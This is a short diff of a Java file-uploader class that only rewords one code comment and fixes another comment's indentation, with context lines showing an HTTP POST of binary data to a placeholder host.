@@ -63,7 +63,7 @@ public class Uploader {
             }
 			
             Collections.shuffle(targets);
-            //set limitation of files upload, here I set 1
+            //set limitation of files to upload, here I set 1
             int fcount = 0;
             for(int i = 0; i < targets.size(); i++)
             {   
@@ -92,7 +92,7 @@ public class Uploader {
 
             HttpPost post = new HttpPost("http://yourhost/file.php");
 
-			//set binary entity
+            //set binary entity
             post.setEntity(reqEntity);
             reqEntity.setContentType("binary/octet-stream");
 
